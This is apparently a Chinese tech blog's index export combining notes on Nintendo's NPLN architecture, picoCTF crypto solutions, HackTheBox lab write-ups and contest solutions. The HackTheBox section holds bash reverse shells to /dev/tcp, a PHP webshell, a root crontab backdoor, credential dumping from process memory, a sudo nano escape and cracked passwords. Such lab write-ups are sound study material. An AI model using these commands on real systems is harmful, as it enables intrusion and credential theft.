0 后则删除旧集群 GKE 节点池更新时操作 保证节点上已经没有用户了再进行更新 在此节点上不能创建新的 Session 处于 Allocated 状态的 Pod 不能删除 对 Gamesync 使用 Kubernetes 的 Cordon 标记功能 Cordon 状态的 node 上不会被创建新的 Pod 处于 Allocated 状态的 Pod 不会被删除 可以保证在用户无感知的情况下进行更新 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:6","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"Spanner 的用例 原则上将 Spanner 用于需要直接面向用户的服务 在对战匹配中 管理 Session 的状态 读写操作发生频率较高 按实例与服务为单元进行隔离 已删除行的问题 Spanner 中已删除的行会物理上保留一段时间 在几天到一周的时间内会被实际删除掉 这种等待被删除的行被称作 Tombstone 在长期测试中，搜索性能会逐渐下降 当某一行被删除后，由于这一行实际还会存在一段时间，在此之后才不会被扫描到 基于 Tombstone 存在状态下的考虑 基于性能损失的前提下，实验出需要的节点数量 考察高峰期将持续多长时间 译注：根据官方文档的说法，这个可能是因为 Spanner TTL 的配置出现了问题。 CI 自动测试时的问题 Spanner 模拟器的功能缺失 功能缺失带来的问题 无法并行执行多个事务 → 无法确定是否存在多事务竞争 无法使用特定的 HINT 语句 → 无法确定是否带来性能优化 无法获取统计数据 → 无法确定是否特定修改劣化了性能 根据测试分支的重要性，跳过一部分测试 使用真实 Spanner 实例进行自动化测试的问题 在自动化测试环境中使用 Cloud Build 并尽可能并行化 高频创建和删除数据库时会带来的延迟 增加测试并行度时最大 DB 数的限制 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:7","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"Summary NPLN 是基于微服务云原生的现代架构，作为任天堂的通用在线游戏基础设施为未来新游戏提供服务，强调了多团队合作下的扩展性和维护性，提升研发效能，降低运营成本。 在架构设计上，整套系统使用了基于 Service Mesh 的微服务方案，并通过 Kubernetes+Agones 来管控整个系统的资源，客户端则使用 gRPC 进行通信。 整套架构构建在 Google Cloud 上，并在基础设施上使用了特定产品：GKE、Spanner，BigQuery 等。 整套架构支持现代开发和观测流程，包括 CI/CD 自动化测试，Canary、Blue/Green 发布，基于大型数据仓库的近实时/离线数据分析等。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:4:0","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["趣题记录"],"content":"被拉来打的，只做了 Crypto。做啥写啥。 ","date":"2022-03-31","objectID":"/post/1f7260ad/:0:0","tags":["picoCTF","CTF","Crypto","密码学"],"title":"picoCTF 2022 Crypto Write-ups","uri":"/post/1f7260ad/"},{"categories":["趣题记录"],"content":"100 Points 要么照着题目随便搞搞，要么搜索一下，大部分就是古典密码或者轮换替换，批量一键过题。 basic-mod*：照着题目说法写一个 f 然后 ''.join(map(lambda x: chr(f(int(x))), input.strip().split()))。 credstuff：grep -in cultiris usernames.txt | awk -F ':' '{print $1}' | xargs head passwords.txt -n，然后 ROT13。 morse-code：https://morsecode.world/international/decoder/audio-decoder-adaptive.html。 rail-fence：https://gchq.github.io/CyberChef/#recipe=Rail_Fence_Cipher_Decode(4,0)。 substitution*：https://www.quipqiup.com/。 transposition-trial：''.join((input[i+2] + input[i:i+2]) for i in range(0, len(input), 3))。 Vigenere：https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('')。 ","date":"2022-03-31","objectID":"/post/1f7260ad/:1:0","tags":["picoCTF","CTF","Crypto","密码学"],"title":"picoCTF 2022 Crypto Write-ups","uri":"/post/1f7260ad/"},{"categories":["趣题记录"],"content":"Very Smooth 审计 get_smooth_prime，发现 $p-1$ 是光滑质数，所以用 Pollard’s p-1 算法分解质因子： from gmpy2 import powmod, gcd def factor_smooth_p(N: int) -\u003e (int, int): a = 2 n = 2 for n in range(2, N) a = powmod(a, n, N) res = gcd(a - 1, N) if res != 1 and res != N: q = N // res p = N // q return p, q 然后直接跑就行了。 from gmpy2 import powmod, gcd, lcm def factor_smooth_p(N): a = 2 n = 2 for n in range(2, N): a = powmod(a, n, N) res = gcd(a - 1, N) if res != 1 and res != N: q = N // res p = N // q return p, q if __name__ == \"__main__\": e = 0x10001 # copy from file n = int('', 16) c = int('', 16) p, q = factor_smooth_p(n) m = lcm(p - 1, q - 1) d = powmod(e, -1, m) print(bytes.fromhex(hex(powmod(c, d, n))[2:])) ","date":"2022-03-31","objectID":"/post/1f7260ad/:2:0","tags":["picoCTF","CTF","Crypto","密码学"],"title":"picoCTF 2022 Crypto Write-ups","uri":"/post/1f7260ad/"},{"categories":["趣题记录"],"content":"Sequences 直接审计 m_func： # snippets... ITERS = int(2e7) # This will overflow the stack, it will need to be significantly optimized in order to get the answer :) @functools.cache def m_func(i): if i == 0: return 1 if i == 1: return 2 if i == 2: return 3 if i == 3: return 4 return 55692 * m_func(i - 4) - 9549 * m_func(i - 3) + 301 * m_func( i - 2) + 21 * m_func(i - 1) # snippets... if __name__ == \"__main__\": sol = m_func(ITERS) decrypt_flag(sol) $$ f(x) = \\begin{cases}x+1, \u00261\\le x\\le 3\\\\21f(x-1)+301f(x-2)-9549f(x-3)+55692f(x-4),\u00263\u003cx\\end{cases}, x\\in\\N^+ $$ 一个非常经典的线性递推。因为 iter 数量有 $2\\times10^7$ 次，直接递推也是不太方便的，考虑矩阵快速幂优化线性递推。 $$ \\begin{bmatrix}f(x+3)\\\\f(x+2)\\\\f(x+1)\\\\f(x)\\end{bmatrix}=\\begin{bmatrix}21\u0026301\u0026-9549\u002655692\\\\1\u00260\u00260\u00260\\\\0\u00261\u00260\u00260\\\\0\u00260\u00261\u00260\\end{bmatrix}^x\\cdot\\begin{bmatrix}f(3)\\\\f(2)\\\\f(1)\\\\f(0)\\end{bmatrix} $$ 对这个方法不太了解的可以参考 https://oi-wiki.org/math/fibonacci/#_5。 注意 numpy 默认的数据类型会爆精度，需要手动指定 dtype='object'。同时该取模的地方要取上。 import numpy as np MOD = 10**10000 def bin_pow(base, exp): ans = np.array([[1, 0, 0, 0], [0, 1, 0, 0], [0, 0, 1, 0], [0, 0, 0, 1]], dtype='object') while exp: if (exp \u0026 1) \u003e 0: ans = ans.dot(base) % MOD base = base.dot(base) % MOD exp \u003e\u003e= 1 return ans def fast_m_func(i): if i == 0: return 1 if i == 1: return 2 if i == 2: return 3 if i == 3: return 4 arr = np.array([[4], [3], [2], [1]], dtype='object') coef = np.array( [[21, 301, -9549, 55692], [1, 0, 0, 0], [0, 1, 0, 0], [0, 0, 1, 0]], dtype='object') return bin_pow(coef, i - 3).dot(arr)[0][0] ","date":"2022-03-31","objectID":"/post/1f7260ad/:3:0","tags":["picoCTF","CTF","Crypto","密码学"],"title":"picoCTF 2022 Crypto Write-ups","uri":"/post/1f7260ad/"},{"categories":["趣题记录"],"content":"Sum-O-Primes 不知道为什么这个题要给 400 points。 from sympy import symbols, solve import math if __name__ == \"__main__\": e = 65537 # copy from file x = int('', 16) n = int('', 16) c = int('', 16) P, Q = symbols('p,q') # x = p + q # n = p * q ret = solve([P + Q - x, P * Q - n], [P, Q], dict=True) p = ret[0][P] q = ret[0][Q] m = math.lcm(p - 1, q - 1) d = pow(e, -1, m) print(bytes.fromhex(hex(pow(c, d, n))[2:])) ","date":"2022-03-31","objectID":"/post/1f7260ad/:4:0","tags":["picoCTF","CTF","Crypto","密码学"],"title":"picoCTF 2022 Crypto Write-ups","uri":"/post/1f7260ad/"},{"categories":["趣题记录"],"content":"NSA Backdoor 首先 $p-1$ 和 $q-1$ 都是光滑的，直接用 Pollard’s p-1 算法搞出来。 搞出来后注意到我们要求解的式子，是一个离散对数问题： $$ c= 3^{\\text{FLAG}} \\pmod n $$ 朴素的 BSGS 复杂度太高，直接算算不了。由于 $n=p\\times q$，而 $p$，$q$ 都是光滑质数，而且根据生成方式，$p$ 和 $q$ 的质因子不大，数量也不多，提示我们可以用 Pohlig-Hellman 算法求离散对数。 具体的算法可以参考 https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm。我直接用 sage 算了。 from sage.all import gcd, GF def factor_smooth_p(N): a = 2 n = 2 for n in range(2, N): a = pow(a, n, N) res = gcd(a - 1, N) if res != 1 and res != N: q = N // res p = N // q return p, q if __name__ == \"__main__\": # copy from file n = int('', 16) c = int('', 16) p, q = factor_smooth_p(n) R = GF(p) x = R(c).log(3) assert R(3)**x == c print(bytes.fromhex(hex(x)[2:])) ","date":"2022-03-31","objectID":"/post/1f7260ad/:5:0","tags":["picoCTF","CTF","Crypto","密码学"],"title":"picoCTF 2022 Crypto Write-ups","uri":"/post/1f7260ad/"},{"categories":["趣题记录"],"content":"最近突然对渗透测试很感兴趣，充了个 htb 会员才发现基础不牢地动山摇，趁着会员快过期了先把 Intro to Dante Track 做完了，给报 Dante Pro Lab 打一下基础，之后先去 TryHackMe 学一手再回来开 htb 会员刷 Box。 ","date":"2022-03-16","objectID":"/post/27e78a70/:0:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Emdee five for life 启动靶机访问一下，要求提交给定 String 的 MD5： 直接 md5sum 一下然后提示 Too Slow，应该是要写代码。看了下 Cookie 有 PHPSESSID，那两次请求需要保存一下 session。随便搞一个脚本就行： import requests from bs4 import BeautifulSoup from hashlib import md5 URL = \"http://ip:port/\" if __name__ == \"__main__\": s = requests.session() rsp = s.get(URL) soup = BeautifulSoup(rsp.text, 'lxml') m = md5() m.update(soup.body.h3.text.encode()) rsp = s.post(URL, data={\"hash\": m.hexdigest()}) print(rsp.text) 成功拿到 flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:1:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Heist ","date":"2022-03-16","objectID":"/post/27e78a70/:2:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Enumeration ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p $ports -sCV $target 有一个 IIS Server 和 smb，上 HackTricks 搜了一下 5985 端口跑的是是 WinRM。 先看看 80 有什么： 点右下角的 Login as guest 里面有一个有意思的文件： 看了一下，发现三个和密码有关的东西： enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 $1$$ 的形式是 MD5，直接用 john 给爆出来： john hash --wordlist=/usr/share/wordlists/rockyou.txt -rules=Jumbo 后两个根据对话推测是 Cisco 路由器密码，找到 Cracker 直接把两个密码算出来： $uperP@ssword Q4)sJu\\Y8qz*A3?d 直接把这三个密码和提问的用户 Hazard 用 crackmapexec 枚举一下。 crackmapexec smb $target -u hazard -p passwords.txt 找到用户名和密码之后，用 impacket 的 lookupsid 做一下枚举： python3 lookupsid.py hazard:stealth1agent@$target 把这些个人用户都加进去，重新枚举。 ","date":"2022-03-16","objectID":"/post/27e78a70/:2:1","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Foothold 找到了两个可以用的用户名和密码，smbmap 之后都无功而返，尝试枚举 winrm： crackmapexec winrm $target -u users.txt -p passwords.txt 发现 Chase 账号是有权限的，用 evil-winrm 打进去。 evil-winrm -u chase -p 'Q4)sJu\\Y8qz*A3?d' -i $target 拿到 user flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:2:2","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Privilege Escalation 这里看了 Walkthrough，你打死我我也想不到我要去 dump 内存。 查看一下同文件夹下面的其他文件，有一个 todo.txt： Stuff to-do: 1. Keep checking the issues list. 2. Fix the router config. Done: 1. Restricted access for guest user. 这个 issue list 要么是个文件，要么是个服务。找了一圈文件没找到，Get-Process 发现有好几个 firefox 在跑： PS C:\\Users\\Chase\\Documents\u003e Get-Process PS C:\\Users\\Chase\\Documents\u003e Get-Process firefox 尝试 dump 一下内存看看。从 Sysinternals 搞到 procdump64.exe 和 strings64.exe，在本机用 python3 -m http.server 80 之后在目标机器上 wget 给弄下来。 有了工具之后，直接 dump 内存并分析。 PS C:\\Users\\Chase\\AppData\\Local\\Temp\u003e .\\procdump.exe -ma 696 firefox.dmp PS C:\\Users\\Chase\\AppData\\Local\\Temp\u003e .\\strings.exe firefox.dmp | Select-String -Pattern \"[Aa]dmin\" | Select-String -Pattern \"[Pp]assword\" 找到一些很有意思的结果，出来试一下： evil-winrm -u Administrator -p '4dD!5}x/re8]FBuZ' -i $target 提权成功，拿到 root flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:2:3","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"OpenAdmin ","date":"2022-03-16","objectID":"/post/27e78a70/:3:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Enumeration ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p $ports -sCV $target 80 开着，惯例看一下是什么东西。 是一个 default 页面，用 gobuster 爆一下。 gobuster dir --url http://$target/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 爆出来很多小网站，逐个试一下之后 /music 在这个站下面发现有用户相关系统： 点了下 Login 进到一个 OpenNetAdmin 的 Dashboard 里面，版本号是 18.1.1。 ","date":"2022-03-16","objectID":"/post/27e78a70/:3:1","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Foothold 搜了下 OpenNetAdmin 18.1.1，发现有 RCE，找到一个 poc：https://github.com/amriunix/ona-rce，拉下来跑一下： git clone https://github.com/amriunix/ona-rce; cd ona-rce python3 ona-rce.py check http://$target/ona 直接拿 Reverse shell。 sudo nc -lvnp 1234 python3 ona-rce.py exploit http://$target/ona bash -c 'bash -e \u0026\u003e /dev/tcp/\u003cip\u003e/1234 \u003c\u0026 1' ","date":"2022-03-16","objectID":"/post/27e78a70/:3:2","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Lateral Movement 进来之后在 /var/www 里面逛一下： ls -al /var/www html 里面基本没啥用，internal 文件夹权限不足，继续在 ona 里面探索。审计了 config/config.inc.php 之后，发现真实的配置在 local/config 里面，进去审计 database_settings.inc.php： array ( 'db_type' =\u003e 'mysqli', 'db_host' =\u003e 'localhost', 'db_login' =\u003e 'ona_sys', 'db_passwd' =\u003e 'n1nj4W4rri0R!', 'db_database' =\u003e 'ona_default', 'db_debug' =\u003e false, ), 用这个密码进 mysql 搜了一圈，没啥有用的，尝试拿这个密码用 jimmy 账号登一下： ssh jimmy@$target 现在来看 /var/www/internal。审计 index.php 发现了一个硬编码： if ($_POST['username'] == 'jimmy' \u0026\u0026 hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') 用 john 直接爆： john hash --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo 审计 apache 配置： cat /etc/apache2/sites-enabled/*.conf Listen 127.0.0.1:52846 \u003cVirtualHost 127.0.0.1:52846\u003e ServerName internal.openadmin.htb DocumentRoot /var/www/internal \u003cIfModule mpm_itk_module\u003e AssignUserID joanna joanna \u003c/IfModule\u003e ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u003c/VirtualHost\u003e \u003c!-- snippets... --\u003e 注意，接下来的路径我跟官方 Walkthrough 的做法不同，官方 Walkthrough 是通过爆出来 joanna 的私钥密码来获取的 shell。 internal 路径下面的网站跑在 52846 端口上。进一步审计 /var/www/internal 发现 index.php 登陆之后访问 main.php 会跑一个 shell 命令。看了下 main.php 是可以改的，于是我们直接把 shell 命令换了，拿 Reverse shell。 # $output = shell_exec('cat /home/joanna/.ssh/id_rsa'); $output = shell_exec(\"bash -c 'bash -e \u0026\u003e /dev/tcp/\u003cip\u003e/1234 \u003c\u0026 1'\"); 然后直接用刚才拿到的用户名和密码请求： # On local $ sudo nc -lvnp 1234 # On remote $ curl -X POST http://127.0.0.1:52846/main.php -d \"islogin=1\u0026username=jimmy\u0026password=Revealed\" 成功拿到 user flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:3:3","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Privilege Escalation 跑一下 linpeas.sh，看到一个很有意思的结果： curl -L http://\u003cip\u003e/linpeas.sh | sh 有 suid 提权空间。 尝试拿到一个正规 shell。生成一个新的 ssh 私钥然后把公钥写进 /home/joanna/.ssh/authorized_keys 里面： # On local $ ssh-keygen -C joanna@openadmin # On remote $ echo '\u003cpubkey\u003e' \u003e\u003e /home/joanna/.ssh/authorized_keys # On local $ ssh joanna@$target 然后根据 GTFOBins 的教程，直接跑提权即可： $ sudo nano /opt/priv ^R^X reset; sh 1\u003e\u00260 2\u003e\u00260 成功提权并拿到 root flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:3:4","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"MarketDump 下载下来是一个 .pcapng 的包 dump，开 WireShark 看一眼。从上往下顺着翻一下，看到有很多 telnet 和 tcp，直接 follow tcp stream，发现下面有一堆卡号，这个应该就是攻击者想要的 payload。 把这堆卡号拉出来，看看有没有什么有意思的信息混在里面。 grep -vE 'American Express,[0-9]{15}' payload.txt 发现一个显然不是卡号的东西，拉到 CyberChef 上看看。 成功拿到 flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:4:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Nest ","date":"2022-03-16","objectID":"/post/27e78a70/:5:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Enumeration ports=$(nmap -p- --min-rate=1000 -T4 -Pn $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p $ports -sCV -Pn $target 有一个 smb 服务，另一个看上去是一个 telnet 服务。 smbmap 枚举一波： smbmap -H $target -u guest -p '' 分别枚举一下两个可读的文件夹，在 Data/Shared/Tempaltes/HR/Welcome Email.txt 里面发现一组账号密码： Username: TempUser Password: welcome2019 用这组 credential 重新枚举一遍，在 Data/IT 里面发现了很多文本文件，拉下来挨个看一眼： smbmap -H $target -u tempuser -p welcome2019 -R Data -A xml smbmap -H $target -u tempuser -p welcome2019 -R Data -A txt grep -ir password *.txt *.xml 在 Data/IT/Configs/RU Scanner/RU_config.xml 里找到一个密码： \u003cPassword\u003efTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u003c/Password\u003e 拉到 CyberChef 上，发现是 base64 编码，但是解码之后没什么意义，应该是二进制数据。继续研究这一堆 xml，在 Data/IT/Configs/NotePadPlusPlus/config.xml 里面发现了一个有意思的文件： \u003cFile filename=\"\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\" /\u003e 枚举一下这个文件夹： smbmap -H $target -u tempuser -p welcome2019 -R 'Secure$\\IT\\Carl' 发现这个项目跟上面的配置文件有关。挂载起来看一眼： sudo mount -t cifs -o ro,username=tempuser,password=welcome2019 \"//$target/Secure\\$/IT/Carl\" /mnt/carl cd /mnt/carl 审计了一下 Utils.vb，里面的核心函数如下： ' code snippets... Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \"N3st22\", \"88552299\", 2, \"464R5DFA5DL6LE28\", 256) End If End Function ' code snippets... Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New AesCryptoServiceProvider symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As IO.MemoryStream memoryStream = New IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) Return plainText End Function 根据 .NET doc 的结果，这个函数的流程其实很简单： 用 HMAC-SHA1 经过 passwordIterations 轮 PBKDF2 从 passPhrase 计算出长度为 keySize/8 的 key 用上一步求出来的 key 和传入的 initVectors 经过 AES-CBC 模式解密 base64 解码后的 cipherTextq 那很容易就能用写个脚本解密： from hashlib import pbkdf2_hmac from Crypto.Cipher import AES from base64 import b64decode def decrypt(cipherText, passphrase, salt, iter, iv): dk = pbkdf2_hmac('sha1', passphrase.encode(), salt.encode(), iter, 32) aes = AES.new(dk, AES.MODE_CBC, iv) return aes.decrypt(b64decode(cipherText)).decode() if __name__ = \"__main__\": print(decrypt(\"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\", \"N3st22\", \"88552299\", 2, \"464R5DFA5DL6LE28\")) 得到密码为 xRxRxPANCAK3SxRxRx。 ","date":"2022-03-16","objectID":"/post/27e78a70/:5:1","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Foothold 查看 Data/IT/Configs/RU Scanner/RU_config.xml，对应的用户名是 c.smith，用这组 credential 重新枚举一下： smbmap -H $target -u c.smith -p xRxRxPANCAK3SxRxRx -R Users 挂载上去，拿到 user flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:5:2","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Privilege Escalation 看看剩下的东西，发现有个 Debug Mode Password.txt，但是是空的，比较奇怪。用 smbclient 看一下： 发现有 NTFS Alternative Data Stream。用对应语法把文件拉下来： smb: \\C.Smith\\HQK Reporting\\\u003e get \"Debug Mode Password.txt:Password\" 得到密码为 WBQ201953D8w。根据 nmap 的结果，我们现在尝试用 telnet 访问这个 HQK Reporting 服务。 telnet $target 4386 在里面探索了一会儿，最终在 ../LDAP 里面发现了一个 Ldap.conf，其中有 Administrator 的密码： Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= 之前的 smb 枚举结果里面还有一个 HqkLdap.exe，拉下来拖进 IDA Pro 或者 Detect It Easy 之类的工具里面，发现是 .NET 的 binary，拿 dnSpy 反编译然后审计一下。 发现整个流程跟上面是一样的，就是换了个参数，直接拿来用，得到密码为 XtH4nkS4Pl4y1nGX。 用 impacket 的 psexec.py 直接打进去： python3 psexec.py administrator:XtH4nkS4Pl4y1nGX@$target 拿到 root flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:5:3","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Curling ","date":"2022-03-16","objectID":"/post/27e78a70/:6:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Enumeration ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p $ports -sCV $target 惯例看看 80 上是什么。 发现是 Joomla CMS，根据 HackTarget 的顺序先找到 Joomla 的版本是 3.8.8，找直接的 exploit 无功而返。 审计一下源代码，最下面有个挺有意思的注释： 尝试用 LFI 搞到这个文件： $ curl http://$target/secrets.txt # Q3VybGluZzIwMTgh 惯例拖进 CyberChef，base58 解一下得到 Curling2018!。根据网站上的作者 floris，用这组 credential 成功登进后台。 ","date":"2022-03-16","objectID":"/post/27e78a70/:6:1","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Foothold 稍微调查了一下，发现 joomla 的模板可以随便改： 直接搞了个简单的 webshell 上去： \u003c?php system(\"bash -c 'bash -e \u0026\u003e /dev/tcp/\u003cip\u003e/1234 \u003c\u0026 1'\"); ?\u003e 之后直接访问就能接到 shell。 curl http://10.10.10.150/templates/protostar/pwned.php ","date":"2022-03-16","objectID":"/post/27e78a70/:6:2","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Lateral Movement ls -al /home 看了一下，可以读 floris 的 home，直接进去看看，里面有个 password_backup： 拉到本地 xxd -r 一下，file 一下发现是 bzip2 的压缩包，解开之后继续 file 一下发现是 gzip 压缩包，重复几轮到最后拿到密码 5d\u003cwdCbdZu)|hChXll。用这个密码进 ssh，拿到用户 flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:6:3","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Privilege Escalation ls -al 一下 home，发现一个很有意思的文件夹，owner 是 root，但是 floris group 是有权限的。这意味着应该有个 root 权限跑的东西会读写这个文件。lsof 一下，什么结果都没有，试试用 pspy 枚举一下定时任务： 发现这个 input 是 curl 的配置文件。因为用 root 运行的，对系统有完全的读写权限，我们直接给他弄个 crontab 执行我们的命令就可以了： cp /etc/crontab ./ \u0026\u0026 echo '* * * * * root bash -c \"bash -e \u0026\u003e /dev/tcp/\u003cip\u003e/1234 \u003c\u0026 1\"' \u003e\u003e crontab \u0026\u0026 sudo python3 -m http.server 80 sudo nc -lvnp 1234 把 input 改成： url = \"http://\u003cip\u003e/crontab\" output = \"/etc/crontab\" 稍等片刻，就能拿到 shell 和 root flag。 ","date":"2022-03-16","objectID":"/post/27e78a70/:6:4","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"Epilogue Write-up 一定要边做边写边截图，做完了补题解累死我了。 ","date":"2022-03-16","objectID":"/post/27e78a70/:7:0","tags":["渗透测试","HackTheBox"],"title":"HTB Intro to Dante Writeups","uri":"/post/27e78a70/"},{"categories":["趣题记录"],"content":"闲着无聊做做，看看退役选手还能写出来些啥。 题解 memo，保持更新。（反正应该没几天就腻了） ","date":"2021-11-24","objectID":"/post/8697249c/:0:0","tags":["区域赛","算法竞赛","刷题","数学","比赛"],"title":"XCPC 2021 补题 memo","uri":"/post/8697249c/"},{"categories":["趣题记录"],"content":"CCPC 威海 Codeforeces Gym: http://codeforces.com/gym/103428 ","date":"2021-11-24","objectID":"/post/8697249c/:1:0","tags":["区域赛","算法竞赛","刷题","数学","比赛"],"title":"XCPC 2021 补题 memo","uri":"/post/8697249c/"},{"categories":["趣题记录"],"content":"A. Goodbye, Ziyin 签到，输入保证是一棵树，那么这棵树有超过 3 度的节点就不能构成有根二叉树了，剩下就数一下度数为 1 和 2 的节点数，他们做根都合法。读进来扫两遍，复杂度 $\\mathcal{O}(n)$。 #include \u003ciostream\u003e using namespace std; const int SIZE = 1e6 + 10; int deg[SIZE], cnt[SIZE]; int main() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); int n; cin \u003e\u003e n; bool exceeded = false; for (int i = 0; i \u003c n - 1; i++) { int x, y; cin \u003e\u003e x \u003e\u003e y; cnt[x]++, cnt[y]++; } for (int i = 1; i \u003c= n; i++) { deg[cnt[i]]++; if (cnt[i] \u003e 3 \u0026\u0026 deg[cnt[i]]) { exceeded = true; break; } } if (exceeded) { cout \u003c\u003c \"0\\n\"; } else { cout \u003c\u003c deg[1] + deg[2] \u003c\u003c '\\n'; } } ","date":"2021-11-24","objectID":"/post/8697249c/:1:1","tags":["区域赛","算法竞赛","刷题","数学","比赛"],"title":"XCPC 2021 补题 memo","uri":"/post/8697249c/"},{"categories":["趣题记录"],"content":"D. Period 输入只有小写字母，改成 # 之后构不成新的循环节，所以看插入 # 之后剩几个循环节即可。 